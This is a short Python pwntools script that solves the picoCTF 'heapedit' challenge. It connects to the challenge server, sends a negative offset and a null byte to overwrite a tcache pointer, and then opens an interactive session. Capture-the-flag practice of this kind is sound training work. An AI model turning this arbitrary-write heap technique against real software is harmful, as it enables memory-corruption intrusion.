#!/usr/bin/env python3

from pwn import *

"""
freed malloc is stored in the tcache
find address that reallocates the last bin and change it so the last address pointed to is not the "lose" heap
"""

def conn():
    r = remote("mercury.picoctf.net", 34499)
    #r = process("./heapedit")
    #gdb.attach(r)

    return r


def main():
    r = conn()
    addr = b"-5144" # 0x1418 input address - offset
    val = "\x00"

    r.recvuntil(b"Address:")
    r.sendline(addr)
    r.recvuntil(b"Value:")
    r.sendline(val.encode())

    r.interactive()
    r.close()


if __name__ == "__main__":
    main()
